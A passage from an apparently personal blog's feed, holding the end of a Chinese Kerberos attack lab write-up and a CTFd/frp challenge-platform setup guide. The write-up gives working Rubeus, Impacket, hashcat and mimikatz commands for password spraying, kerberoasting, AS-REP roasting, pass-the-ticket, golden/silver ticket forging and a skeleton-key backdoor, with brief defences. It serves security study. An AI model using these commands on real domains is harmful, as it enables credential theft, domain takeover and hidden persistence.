获取服务票证，也可用于诸如传递票证攻击之类的攻击。</p></blockquote><p>在使用Rubeus进行密码喷洒之前，，需要将域控制器域名添加到windows的主机文件中。可以直接使用echo命令将IP和域名添加到计算机的主机文件中</p><pre class="line-numbers language-none"><code class="language-none">echo 10.01.147.97 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre><p>Rubeus喷洒密码命令</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe brute &#x2F;password:Password1 &#x2F;noticket</code></pre><p>以上命令将使用给定密码（上面命令中指定的是Password1）喷洒到所有找到的账户中，然后为该用户提供.kirbi TGT（即将上文中抓取到的TGT给现在爆破出来的用户使用）</p><p>ps：在进行像喷洒密码这种包里攻击时大概率会触发安全策略而导致账户锁定。</p><h2 id="使用Rubeus和Impacket进行kerberoasting"><a href="#使用Rubeus和Impacket进行kerberoasting" class="headerlink" title="使用Rubeus和Impacket进行kerberoasting"></a>使用Rubeus和Impacket进行kerberoasting</h2><p>这里将介绍kerberos中最流行的攻击之一——kerberoasting。kerberoasting允许用户请求具有注册SPN的任何服务的服务票证，然后使用该票证破解服务密码（服务账户）。如果一个服务有注册SPN，那么它是Kerberoastable的。但是攻击的成功取决于密码的强度、密码是否可追踪以及被破解的服务账户的权限。</p><p>要枚举Kerberoastable账户，建议使用BloodHound之类的工具来查找所有kerberoastable账户它允许你查看可以对哪些账户进行kerberoast（如果它们是域管理员），以及它们与域的其余部分有什么样的连接等等。</p><p>这里将使用Rubeus和Impacket进行攻击，同样的使用kekeo和Invoke-Kerberoast也能进行攻击。</p><h3 id="使用Rubeus进行Kerberoasting"><a href="#使用Rubeus进行Kerberoasting" class="headerlink" title="使用Rubeus进行Kerberoasting"></a>使用Rubeus进行Kerberoasting</h3><p>ps：以下操作是在内网机器上进行操作的。</p><p>以下命令将转储任何kerberoastable用户的Kerberos哈希值</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast</code></pre><p><img src="https://i.imgur.com/XZegVqf.png"></p><p>将获得的hash储存到本地的.txt文件中，然后使用hashcat破解它。</p><p>使用hashcat破解需要提前准备好密码字典</p><p>破解命令</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 -a 0 hash.txt password.txt</code></pre><h3 id="使用Impacket进行kerberoasting"><a href="#使用Impacket进行kerberoasting" class="headerlink" title="使用Impacket进行kerberoasting"></a>使用Impacket进行kerberoasting</h3><blockquote><p>Impacket安装教程</p><p>自 0.9.20 以来，Impacket 版本一直不稳定，我建议安装 Impacket &lt; 0.9.20</p><p>1.)<code>cd /opt</code> 导航到您的首选目录以保存工具 </p><p><a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19">2.) 从https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19</a>下载预编译包 </p><p>3.)<code>cd Impacket-0.9.19</code> 导航到 impacket 目录</p><p>4.) <code>pip install .</code>- 这将安装所有需要的依赖项</p></blockquote><p>Impacket使用命令</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples &#x2F;&#x2F;进入GetUserSPNs.py所在位置</code></pre><pre class="line-numbers language-none"><code class="language-none">sudo python3 GetUserSPNs.py controller.local(域名)&#x2F;Machine1(机器名称):Password(密码) -dc-ip 目标机器IP -request</code></pre><p>↑这将转储它可以在目标域上找到的所有kerberoastable账户的kerberos哈希值，就像Rubeus所做的那样；但是与Rubeus不同的是它不用再目标机器上进行操作，并且可以远程完成。</p><p>破解hash步骤相同</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 -a 0 hash.txt Pass.txt</code></pre><h3 id="获得服务账户后可以做什么？"><a href="#获得服务账户后可以做什么？" class="headerlink" title="获得服务账户后可以做什么？"></a>获得服务账户后可以做什么？</h3><p>破解服务账户的账号密码后有多种方式可以窃取数据和收集所需要的信息。具体取决于服务账户是否为域管理员，如果<strong>服务账户是域管理员，那么就相当于获取了类似金&#x2F;银票据的控制权</strong>，可以收集所需的数据和信息，例如转储NTDS.dit.</p><blockquote><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p></blockquote><p>如果服务账户不是域管理员，那么可以使用它登录其他系统并尝试进行提权。或者可以使用破解的密码来攻击其他服务和域管理员账户；许多公司可能会为其服务或域管理账户重复使用相同或者相似的密码。</p><h3 id="Kerberoasting防御方法"><a href="#Kerberoasting防御方法" class="headerlink" title="Kerberoasting防御方法"></a>Kerberoasting防御方法</h3><ul><li>设置强密码，如果服务账户的密码强，那么kerberoasting将无效</li><li>不将服务账户设置为域管理员，服务账户不需要是域管理员，不将服务账户设置为域管理员，那么kerberoasting攻击成功后的利用难度将增大，不会那么有效。</li></ul><h2 id="使用Rubeus进行AS-REP-roasting"><a href="#使用Rubeus进行AS-REP-roasting" class="headerlink" title="使用Rubeus进行AS-REP roasting"></a>使用Rubeus进行AS-REP roasting</h2><p>域kerberos roasting类似，AS-REP roasting 转储禁用了kerberos预身份验证的用户账户的krbasrep5 hash值。与Kerberoasting不同，这些用户不必是服务账户。对用户进行AS-REP roasting的唯一要求是用户禁用预身份验证。</p><p>这里将继续使用Rubeus，就像进行kerberosroasting和收获一样，Rubeus有一个简单且易于理解命令，可以在禁用kerberos预身份验证的情况下对AS-REP进行roasting和攻击用户。从Rubeus转储hash后，我们将继续使用hashcat来破解krbasrep5哈希值。</p><p>同样的，不止Rubeus可以进行AS-REP Roasting ，keko和impacket的GetNPUsers.py也行。不过Rubeus更易用，它会自动查找AS-REP Roastable用户，而使用GetNPUsers必须事先枚举用户并知道那些用户是AS-REP Roastable。</p><h3 id="AS-REP-Roasting-概述"><a href="#AS-REP-Roasting-概述" class="headerlink" title="AS-REP Roasting 概述"></a>AS-REP Roasting 概述</h3><p>在预身份验证期间，用户hash将用于加密时间戳，域控制器将尝试解密时间戳以验证是否正在使用正确的哈希并且不会重播先前的请求( the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request)。</p><p>验证时间戳后，KDC将为用户颁发TGT。如果禁用预身份验证，你可以请求任何复用的任何身份验证数据，并且KDC将返回一个可以离线破解的加密TGT，因为KDC会跳过验证用户真是身份步骤（可以伪装用户身份）</p><h3 id="使用Rubeus转储kerbasrep5哈希值"><a href="#使用Rubeus转储kerbasrep5哈希值" class="headerlink" title="使用Rubeus转储kerbasrep5哈希值"></a>使用Rubeus转储kerbasrep5哈希值</h3><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe aseproast</code></pre><p>以上命令将运行 AS-REP Roast 命令来查找易受攻击的用户，然后转储找到的易受攻击的用户哈希值。</p><p>获取hash后继续使用hashcat进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 18200 hash.txt Passwd.txt &#x2F;&#x2F;Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </code></pre><blockquote><p>用 hashcat 破解这些哈希 - </p><p>1.) 将哈希值从目标计算机传输到攻击者计算机，并将哈希值放入 txt 文件中</p><p>2.) 在$krb5asrep$后面插入23$，这样第一行就是$krb5asrep$23$User…..</p><p>3.) <code>hashcat -m 18200 hash.txt Pass.txt</code> - 破解这些哈希值！Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </p></blockquote><p><img src="https://i.imgur.com/eOqGVrm.png"></p><h3 id="AS-REP-Roasting预防措施"><a href="#AS-REP-Roasting预防措施" class="headerlink" title="AS-REP Roasting预防措施"></a>AS-REP Roasting预防措施</h3><ul><li>使用强密码，这将耗费更多时间用于hash破解</li><li>除非有必要，不要关闭kerberos预身份验证，除了打开预身份验证外，几乎没有颁发可以完全缓解这种攻击。</li></ul><h2 id="使用mimikatz进行传递票据（PTT-Pass-The-Ticket）"><a href="#使用mimikatz进行传递票据（PTT-Pass-The-Ticket）" class="headerlink" title="使用mimikatz进行传递票据（PTT,Pass The Ticket）"></a>使用mimikatz进行传递票据（PTT,Pass The Ticket）</h2><p>mimikatz属于后渗透利用工具，是非常流行且功能强大，最常用于活动目录网络内转储用户凭据，在这里我们将使用mimikatz从LSASS中转储TGT</p><h3 id="PTT-x2F-Pass-The-Ticket-概述"><a href="#PTT-x2F-Pass-The-Ticket-概述" class="headerlink" title="PTT&#x2F;Pass The Ticket 概述"></a>PTT&#x2F;Pass The Ticket 概述</h3><p>PTT通过从机器的LSASS内存中转储TGT。LSASS（Local Security Subsystem Servic，本地安全机构子系统服务）是一个内存进程，它将凭据储存在活动目录的服务器上，并且可以储存Kerberos票证以及其他凭据类型，以充当网守（gatekeeper）并接受或者拒绝所提供的凭据。攻击者可以从LSASS内存中转储kerberos票证，就像转储hash一样。</p><p>当使用mimikatz转储票证时，它会给我们一个.kirbi票证。如果域管理员票证位于LSASS内存中，则可以使用该票证获得域管理员。如果存在不安全的与服务账户票证，则此攻击对于权限提升和横向移动非常有用。</p><p>如果转储域管理员的票证，然后使用mimikatz PTT攻击模拟该票证，便可以通过该攻击升级为域管理员。PTT攻击的原理就是重用现有票证，并不会创建或者销毁任何票证，只是重用域中其他用户的现有票证并冒充该票证。</p><h3 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a>mimikatz使用</h3><p>cmd输入以下命令启动mimikatz（需要管理员权限）</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe</code></pre><p>输入一下命令来检查是否以管理员权限运行</p><pre class="line-numbers language-none"><code class="language-none">privilege::debug</code></pre><p>如果正确，则输出[output ‘20’ OK]</p><p><img src="https://i.imgur.com/SJQGplV.png"></p><pre class="line-numbers language-none"><code class="language-none">sekulsa::ticket &#x2F;export</code></pre><p>上面的命令会将所有的.kribi票证导出到当前目录中</p><blockquote><p>在此步骤中，您还可以使用我们之前从 Rubeus 获取的 Base 64 编码票证</p></blockquote><p>在导出的票证中寻到管理员票证，就如图中所示</p><p><img src="https://i.imgur.com/xC0L5Kf.png"></p><h3 id="使用mimikatz进行PTT"><a href="#使用mimikatz进行PTT" class="headerlink" title="使用mimikatz进行PTT"></a>使用mimikatz进行PTT</h3><p>我们现在已经准备好了飘逸，可以进行PTT攻击获得域管理员权限。</p><p>在mimikatz中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &lt;ticket&gt;</code></pre><p>上面的ticket是上文中转储的.kirbi票据的全称</p><p><img src="https://i.imgur.com/DwXmm8Z.png"></p><p>使用<code>klist</code>命令来列出缓存中票证以验证我们是否成功模拟票证</p><p><img src="https://i.imgur.com/GgxDm9k.png"></p><p>模拟成功，现在我们已经拥有了和域管理员相同的权力</p><p>可以查看管理员共享</p><p><img src="https://i.imgur.com/9nxjeTS.png"></p><h3 id="PTT攻击的防御方式"><a href="#PTT攻击的防御方式" class="headerlink" title="PTT攻击的防御方式"></a>PTT攻击的防御方式</h3><p>不要让域管理员登录到除了域控制器以外的任何东西。如果域管理员仍登录到一些低级别计算上，容易留下用于攻击和横向移动的票证。</p><h2 id="使用mimikatz进行金-x2F-银票据攻击"><a href="#使用mimikatz进行金-x2F-银票据攻击" class="headerlink" title="使用mimikatz进行金&#x2F;银票据攻击"></a>使用mimikatz进行金&#x2F;银票据攻击</h2><p>有些时候，在限制条件下银票比金票更合适，因为它更谨慎一些。如果<strong>隐身</strong>和<strong>不被发现</strong>很重要，那么银票可能是比金票更好的选择。但是创建票证的方法是完全相同的，两种票证的主要区别在于银票仅限于目标服务，而金票可以访问任何kerberos服务。</p><h3 id="KRBTGT概述"><a href="#KRBTGT概述" class="headerlink" title="KRBTGT概述"></a>KRBTGT概述</h3><p>为了理解这些攻击原理，首要要先了解KRBTGT和TGT之间的区别。KRBTGT是KDC的的服务账户，是向客户发送所有票证的密钥分发中心。</p><p>如果模拟此账户并从KRBTGT创建黄金票证，那么就可以为想要的任何内容创建服务票证。TGT是KDC办法的服务账户票证，只能访问TGT所属的服务，就像SQLService票证一样。</p><h3 id="金银票攻击概述"><a href="#金银票攻击概述" class="headerlink" title="金银票攻击概述"></a>金银票攻击概述</h3><p>金票攻击的工作原理是转储域中任何用户的票证授予票（TGT），这最好是域管理员。</p><p>但是对于金票，要转储的是krbtgt票，对于银票，要转储的是域管理员票。这将为你提供服务&#x2F;域管理员账户的SID或安全标识符（每个用户账户的唯一标识符）以及NTLM哈希，然后可以再mimikat黄金票据攻击中使用这些详细信息，以创建模拟给定服务账户信息的TGT。</p><h3 id="转储krbtgt哈希"><a href="#转储krbtgt哈希" class="headerlink" title="转储krbtgt哈希"></a>转储krbtgt哈希</h3><p>确保mimikatz是以管理员身份运行</p><pre class="line-numbers language-none"><code class="language-none">lsadump::lsa &#x2F;inject &#x2F;name:krbtgt</code></pre><p>以上命令将转储hash以及创建金票据所需的安全标识符。</p><p>如果要创建银票，需要更改<code>/name:要转储的域管理员账户或者服务账户（例如 SQLService）</code>的hash</p><p><img src="https://i.imgur.com/VOEsU4O.png"></p><h3 id="创建金-x2F-银票"><a href="#创建金-x2F-银票" class="headerlink" title="创建金&#x2F;银票"></a>创建金&#x2F;银票</h3><pre class="line-numbers language-none"><code class="language-none">Kerberos::golden &#x2F;user:Administrator &#x2F;domain:ontroller.local &#x2F;sid: &#x2F;krbtgt: &#x2F;id:</code></pre><p>以上是创建金票的命令，创建银票只需要将服务NTLMhash放入krbtgt槽中，服务账户的sid放入sid，并将id更改为103</p><p>金票据创建实例图</p><p><img src="https://i.imgur.com/rh06qDl.png"></p><h3 id="使用金银票访问其他机器"><a href="#使用金银票访问其他机器" class="headerlink" title="使用金银票访问其他机器"></a>使用金银票访问其他机器</h3><pre class="line-numbers language-none"><code class="language-none">misc::cmd</code></pre><p>使用以上命令将在mimikatz中<strong>使用给定的票证</strong>打开一个新的提升命令提示符</p><p><img src="https://i.imgur.com/6HnEnwi.png"></p><p>访问你想要的计算机，你可以访问的内容取决于从票据中获取的用户权限。如果是从krbtgt中获取的票证，那么可以访问整个网络，因此称其为黄金票证。</p><p>然而，银票只能访问用户有权访问的内容，如果他是域管理员，那么几乎可以访问整个网络，但是提升成都比黄金票据稍低。</p><p><img src="https://i.imgur.com/BSh4rXy.png"></p><p>（如果域中没有其他计算机，此攻击将无法进行）</p><h2 id="使用mimiatz植入kerberos后门"><a href="#使用mimiatz植入kerberos后门" class="headerlink" title="使用mimiatz植入kerberos后门"></a>使用mimiatz植入kerberos后门</h2><p>除了使用金银票据维持访问权限以外，在攻击kerberos时，还可以使用mimikatz植入后门。kerberos的后门更加隐蔽，因为其类似于rootkit，将其自身植入域林中，允许自己使用主密码访问任何计算机</p><p>kerberos后门的工作原理是植入万能钥匙，该万能钥匙密码滥用AS-REQ验证加密时间戳的方式。万能密码仅适用于使用Kerberos RC4加密的情况。</p><p>ps：根据上文，执行此攻击需要获取域管理员权限。</p><blockquote><p>mimikatz 万能密钥的默认哈希值是 <em>60BA4FCADC466C7A033C178194C03DF6</em>，密码 是“ <em>mimikatz</em> ”</p></blockquote><h3 id="万能钥匙概述"><a href="#万能钥匙概述" class="headerlink" title="万能钥匙概述"></a>万能钥匙概述</h3><p>万能钥匙的工作原理是滥用AS-REQ加密时间戳。时间戳是使用用户NT hash进行加密的，然后域控制器尝试使用用户NT hash来解密此时间戳，一但植入万能钥匙，域控制器将尝试使用用户NT hash和万能钥匙NT hash来解密时间戳，从而允许攻击者访问域林。</p><h3 id="使用mimikatz安装万能钥匙"><a href="#使用mimikatz安装万能钥匙" class="headerlink" title="使用mimikatz安装万能钥匙"></a>使用mimikatz安装万能钥匙</h3><p>以管理员模式打开mimikatz</p><pre class="line-numbers language-none"><code class="language-none">misc:skeleton</code></pre><p>只需要上面一条命令即可</p><h3 id="进入域林"><a href="#进入域林" class="headerlink" title="进入域林"></a>进入域林</h3><p>默认凭据为：“ <em>mimikatz</em> ”</p><p>示例：<code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - 现在无需管理员密码即可访问共享</p><p>示例：<code>dir \\Desktop-1\c$ /user:Machine1 mimikatz</code> - 访问 Desktop-1 的目录，而不知道哪些用户有权访问 Desktop-1</p><p>万能钥匙不会自行持久保存，因为它在内存中运行，可以使用其他工具和技术对其进行脚本化或持久保存。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在这个房间里，经历的kerberos攻击的基本流程，从枚举可利用账户开始，再到使用Rubeus进行密码爆破获得账户密码，最后再到使用使用mimikatz转储票据，进行金银票攻击，直至最后在域林中植入万能钥匙后门。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;



&lt;h1 id=&quot;kerberos攻击学习&quot;&gt;&lt;a href=&quot;#kerberos攻击学习&quot; class=&quot;headerlink&quot; title=&quot;kerberos攻击学习&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CTFD动态靶场搭建</title>
    <link href="https://mizore.site/article/CTFD%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/CTFD%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <id>https://mizore.site/article/CTFD%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/CTFD%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</id>
    <published>2023-08-27T05:53:52.929Z</published>
    <updated>2024-11-24T16:51:49.998Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="CTFD动态靶场搭建"><a href="#CTFD动态靶场搭建" class="headerlink" title="CTFD动态靶场搭建"></a>CTFD动态靶场搭建</h1><p>为了迎接未来的新生赛和未来接活做准备，学习一下如何搭建CTFD靶场顺便练练手。不过这中间踩的坑也是巨多，前前后后搭了好几天才搭好。</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>CTFD使用的是的docker搭建，所以在服务器上需要先装好docker和docker-compose。其中ctfd有多种搭建方式，我采用的是服务器本地起frp服务将题目容器转发到服务器的端口上。</p><h2 id="安装FRP"><a href="#安装FRP" class="headerlink" title="安装FRP"></a>安装FRP</h2><p>下载并安装rp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gzcd frp_0.29.0_linux_amd64cd frp_0.29.0_linux_amd64sudo cp systemd&#x2F;* &#x2F;etc&#x2F;systemd&#x2F;system&#x2F; #移动配置文件sudo mkdir &#x2F;etc&#x2F;frp #创建客户端配置文件sudo cp frpc.ini  frps.ini &#x2F;etc&#x2F;frp&#x2F; #移动客户端配置文件sudo cp frpc  frps &#x2F;usr&#x2F;bin&#x2F; #将客户端和服务端的二进制文件移动至bin文件夹sudo chmod a+x &#x2F;usr&#x2F;bin&#x2F;frpc &#x2F;usr&#x2F;bin&#x2F;frps #给所有用户赋予frpc和frps的可执行权限sudo systemctl enable frps #将frps服务设置为每次开机启动</code></pre><p>编辑frps配置文件</p><pre class="line-numbers language-none"><code class="language-none">vim &#x2F;etc&#x2F;frp&#x2F;frps.ini[common]bind_port &#x3D; 7897bind_addr &#x3D; 0.0.0.0token &#x3D;thisistoken</code></pre><p>启动frps服务</p><pre class="line-numbers language-none"><code class="language-none">systemctl start frps</code></pre><p> 修改&#x2F;etc&#x2F;frp&#x2F;frpc.ini的配置文件</p><p>此处的frpc与上面的frps相对应，连接的是上面启动的frps</p><pre class="line-numbers language-none"><code class="language-none">vim &#x2F;etc&#x2F;frp&#x2F;frpc.ini[common]server_addr &#x3D; 172.17.0.1#此处的IP为docker0的ip，docker0的ip通过ifconfig查看server_port &#x3D; 7897token&#x3D;thisistoken</code></pre><p>再修改frp_0.29.0_linux_amd64&#x2F;frpc.ini  (这个文件会用来配置frpc容器的)</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; 172.17.0.1server_port &#x3D; 7897token&#x3D;thisistokenadmin_addr &#x3D; 172.20.0.3admin_port &#x3D; 7400log_file &#x3D; .&#x2F;frps.log</code></pre><p>创建网络并运行frpc容器</p><pre class="line-numbers language-none"><code class="language-none">docker network create ctfd_frp-containers #创建一个docker网络，名称为ctfd_frp-containersdocker run  -d -v ~&#x2F;frp_0.29.0_linux_amd64&#x2F;frpc.ini:&#x2F;etc&#x2F;frp&#x2F;frpc.ini --network&#x3D;&quot;ctfd_frp-containers&quot; --restart&#x3D;always &quot;glzjin&#x2F;frp&quot;  #运行容器并将本地的frpc.ini挂载到容器内。网络名称为ctfd_frp-containers</code></pre><p>接着创建frpcadmin网络用语ctfd和frpc容器通信</p><pre class="line-numbers language-none"><code class="language-none">docker network creat frcadmindocker network connect frpcamdin id&lt;刚才启动的frpc容器ID&gt;</code></pre><p>查看frpcadmin网络的连接情况并记录frpc容器的网络IP</p><pre class="line-numbers language-none"><code class="language-none">docker network inspect frpcadmin</code></pre><p>图中的IP就是frpc容器在frpcadmin网络中的IP地址，就是我们在&#x2F;frp&#x2F;frpc.ini中指定的（admin_addr）</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348486.png" alt="image-20230820205128158"></p><p>可以提前把这个地址记录下来，后面配置ctfd-whale的时候会用到。</p><h2 id="安装CTFd和CTFd-whale"><a href="#安装CTFd和CTFd-whale" class="headerlink" title="安装CTFd和CTFd-whale"></a>安装CTFd和CTFd-whale</h2><pre class="line-numbers language-none"><code class="language-none">#下载ctfdgit clone https:&#x2F;&#x2F;github.com&#x2F;CTFd&#x2F;CTFd.git#进入CTFd目录cd CTFd#回退到某个版本，直接执行下面命令git reset 6c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 --hardcd CTFd&#x2F;CTFd&#x2F;plugins&#x2F; #进入plugins目录#下载插件并确保文件名小写git clone https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale.git ctfd-whale#进入ctfd-whalecd ctfd-whale#回退版本git reset 5b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard #回到第一层CTFd目录cd ..&#x2F;..&#x2F;..&#x2F;#配置docker-composevim docker-compose.yml</code></pre><p>docker-compose.yml，直接复制粘贴就行</p><pre class="line-numbers language-none"><code class="language-none">version: &#39;2.2&#39;services:  ctfd:    build: .    user: root    restart: always    ports:      - &quot;8000:8000&quot; #第一个是访问ctfd的端口，第二个是docker端口映射出去的端口    environment:      - UPLOAD_FOLDER&#x3D;&#x2F;var&#x2F;uploads      - DATABASE_URL&#x3D;mysql+pymysql:&#x2F;&#x2F;root:ctfd@db&#x2F;ctfd      - REDIS_URL&#x3D;redis:&#x2F;&#x2F;cache:6379      - WORKERS&#x3D;1      - LOG_FOLDER&#x3D;&#x2F;var&#x2F;log&#x2F;CTFd      - ACCESS_LOG&#x3D;-      - ERROR_LOG&#x3D;-    volumes:      - .data&#x2F;CTFd&#x2F;logs:&#x2F;var&#x2F;log&#x2F;CTFd      - .data&#x2F;CTFd&#x2F;uploads:&#x2F;var&#x2F;uploads      - .:&#x2F;opt&#x2F;CTFd:ro      - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock #添加这句即可，别的基本按照官方的不用动    depends_on:      - db    networks:        default:        internal:  db:    image: mariadb:10.4.12 #这里改成10.4.12，10.4.13会出错    restart: always    environment:      - MYSQL_ROOT_PASSWORD&#x3D;ctfd      - MYSQL_USER&#x3D;ctfd      - MYSQL_PASSWORD&#x3D;ctfd      - MYSQL_DATABASE&#x3D;ctfd    volumes:      - .data&#x2F;mysql:&#x2F;var&#x2F;lib&#x2F;mysql    networks:        internal:    # This command is required to set important mariadb defaults    command: [mysqld, --character-set-server&#x3D;utf8mb4, --collation-server&#x3D;utf8mb4_unicode_ci, --wait_timeout&#x3D;28800, --log-warnings&#x3D;0]  cache:    image: redis:4    restart: always    volumes:    - .data&#x2F;redis:&#x2F;data    networks:        internal:networks:    default:    internal:        internal: true</code></pre><p>进入CTFd目录，修改Dockerfile的内容</p><pre class="line-numbers language-none"><code class="language-none">FROM python:3.6-alpineRUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.aliyun.com&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories &amp;&amp;\    apk update &amp;&amp; \    apk add python3 python3-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-devRUN adduser -D -u 1001 -s &#x2F;bin&#x2F;bash ctfdWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsRUN pip config set global.index-url https:&#x2F;&#x2F;pypi.doubanio.com&#x2F;simpleRUN pip config set install.trusted-host pypi.doubanio.comCOPY requirements.txt .RUN pip install -r requirements.txt -i  https:&#x2F;&#x2F;pypi.doubanio.com&#x2F;simpleCOPY . &#x2F;opt&#x2F;CTFdRUN for d in CTFd&#x2F;plugins&#x2F;*; do \      if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \        pip install -r $d&#x2F;requirements.txt -i  https:&#x2F;&#x2F;pypi.doubanio.com&#x2F;simple; \      fi; \    done;RUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.shRUN chown -R 1001:1001 &#x2F;opt&#x2F;CTFdRUN chown -R 1001:1001 &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>requirements.txt内容</p><pre class="line-numbers language-none"><code class="language-none">Flask&#x3D;&#x3D;1.1.2Werkzeug&#x3D;&#x3D;0.16.0Flask-SQLAlchemy&#x3D;&#x3D;2.4.1Flask-Caching&#x3D;&#x3D;1.4.0Flask-Migrate&#x3D;&#x3D;2.5.2Flask-Script&#x3D;&#x3D;2.0.6SQLAlchemy&#x3D;&#x3D;1.3.11SQLAlchemy-Utils&#x3D;&#x3D;0.36.0passlib&#x3D;&#x3D;1.7.2bcrypt&#x3D;&#x3D;3.1.7six&#x3D;&#x3D;1.13.0itsdangerous&#x3D;&#x3D;1.1.0jinja2&#x3D;&#x3D;2.11.3requests&gt;&#x3D;2.20.0PyMySQL&#x3D;&#x3D;0.9.3gunicorn&#x3D;&#x3D;19.9.0normality&#x3D;&#x3D;2.0.0dataset&#x3D;&#x3D;1.1.2mistune&#x3D;&#x3D;0.8.4netaddr&#x3D;&#x3D;0.7.19redis&#x3D;&#x3D;3.3.11datafreeze&#x3D;&#x3D;0.1.0gevent&#x3D;&#x3D;21.12.0python-dotenv&#x3D;&#x3D;0.10.3flask-restplus&#x3D;&#x3D;0.13.0pathlib2&#x3D;&#x3D;2.3.5flask-marshmallow&#x3D;&#x3D;0.10.1marshmallow-sqlalchemy&#x3D;&#x3D;0.17.0boto3&#x3D;&#x3D;1.10.39markupsafe&#x3D;&#x3D;1.1.1marshmallow&#x3D;&#x3D;2.20.2</code></pre><p>准备好后开始构建容器，进入CTFd目录</p><pre class="line-numbers language-none"><code class="language-none">docker-compose biuld</code></pre><p>启动镜像</p><pre class="line-numbers language-none"><code class="language-none">docker-compose up -d</code></pre><p>启动完之后将ctfd容器加入到frpcadmin的网络之中</p><pre class="line-numbers language-none"><code class="language-none">docker ps #查看ctfd容器的IDdocker network connect frpcadmin #容器ID </code></pre><p>可以看到ctfd容器已经加入到了frpcadmin容器之中了</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348495.png" alt="image-20230821113536575"></p><p>查看容器运行状态</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348969.png" alt="image-20230821113654613"></p><p>访问 ip:8000进入平台，按需填写内容</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348578.png" alt="image-20230821113902068"></p><p>上方导航栏Admin-&gt;Plugins 配置CTFd Whale相关内容</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348850.png" alt="image-20230821141633201"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348069.png" alt="image-20230821141835333"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348639.png" alt="image-20230821142048736"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348211.png" alt="image-20230821142123914"></p><h2 id="添加题目"><a href="#添加题目" class="headerlink" title="添加题目"></a>添加题目</h2><p>上方challenges处添加题目，选择dynamic_docker创建动态题目</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348868.png" alt="image-20230821142321874"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271355544.png" alt="image-20230821142545317"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348434.png" alt="image-20230821142719030"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348154.png" alt="image-20230821142727231"></p><p>最后不要忘记选择动态分数</p><p>成功部署题目</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348073.png" alt="image-20230821142835370"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348601.png" alt="image-20230821142845326"></p><p>flag也是动态flag</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348902.png" alt="image-20230821142949627"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;



